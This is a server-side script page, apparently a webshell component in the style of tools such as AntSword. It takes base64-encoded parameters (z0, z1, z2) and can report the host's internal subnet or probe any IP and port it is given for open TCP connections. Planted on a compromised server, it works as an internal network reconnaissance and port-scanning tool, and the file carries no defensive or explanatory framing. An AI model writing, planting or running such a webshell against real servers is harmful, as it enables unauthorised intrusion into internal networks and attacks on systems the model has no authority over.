<%
(function() {
    response.setContentType("application/json");
    response.setCharacterEncoding("UTF-8");

    function output(msg) {
        if (typeof echo === 'function') {
            echo(msg);
        } else {
            out.print(msg);
        }
    }

    function base64_decode_str(str) {
        if (!str) return "";
        try {
            var decoder = java.util.Base64.getDecoder();
            var decodedBytes = decoder.decode(str);
            return new java.lang.String(decodedBytes, "UTF-8");
        } catch (e) {
            return "";
        }
    }

    function get_network_subnet() {
        var subnet = "192.168.1";
        try {
            var interfaces = java.net.NetworkInterface.getNetworkInterfaces();
            var found = false;

            while (interfaces.hasMoreElements() && !found) {
                var netInterface = interfaces.nextElement();
                if (netInterface.isLoopback() || !netInterface.isUp()) continue;

                var addresses = netInterface.getInetAddresses();
                while (addresses.hasMoreElements()) {
                    var addr = addresses.nextElement();
                    if (addr instanceof java.net.Inet4Address) {
                        var ip = addr.getHostAddress();
                        if (ip !== "127.0.0.1" && ip !== "0.0.0.0") {
                            var parts = ip.split(".");
                            if (parts.length === 4) {
                                subnet = parts[0] + "." + parts[1] + "." + parts[2];
                                found = true;
                                break;
                            }
                        }
                    }
                }
            }
        } catch (e) {
            
        }
        return subnet;
    }

    var z0 = request.getParameter("z0");
    if (!z0) return;

    var action = base64_decode_str(z0);

    if (action === "info") {
        var subnet = get_network_subnet();
        output(JSON.stringify({ "status": "success", "subnet": subnet }));
        return;
    }
    if (action === "check") {
        var z1 = request.getParameter("z1");
        var z2 = request.getParameter("z2");
        if (!z1 || !z2) {
            output(JSON.stringify({ "open": false }));
            return;
        }

        var target_ip = base64_decode_str(z1);
        var target_port = java.lang.Integer.parseInt(base64_decode_str(z2));

        var socket = null;
        try {
            socket = new java.net.Socket();
            var socketAddress = new java.net.InetSocketAddress(target_ip, target_port);
            socket.connect(socketAddress, 1500); // 1.5 秒超時

            if (socket.isConnected()) {
                output(JSON.stringify({ "open": true, "ip": target_ip, "port": target_port }));
            } else {
                output(JSON.stringify({ "open": false }));
            }
        } catch (e) {
            output(JSON.stringify({ "open": false }));
        } finally {
            if (socket !== null) { try { socket.close(); } catch(ex){} }
        }
        return;
    }
})();
%>